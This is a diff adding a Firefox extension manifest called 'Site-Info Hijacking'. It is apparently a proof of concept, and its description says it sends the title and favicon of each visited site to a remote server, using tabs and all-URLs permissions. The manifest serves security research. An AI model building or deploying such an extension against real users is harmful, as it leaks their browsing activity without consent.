@@ -1,0 +1,18 @@
+{
+  "manifest_version": 2,
+  "name": "Site-Info Hijacking",
+  "version": "1.0",
+  "description": "Sends visited site info (Title and Favicon) to a remote server",
+  "permissions": [
+    "tabs",
+    "<all_urls>"
+  ],
+  "background": {
+    "scripts": ["background.js"]
+  },
+  "browser_specific_settings": {
+    "gecko": {
+      "id": "site-info-hijacking@bitm.poc"
+    }
+  }
+}
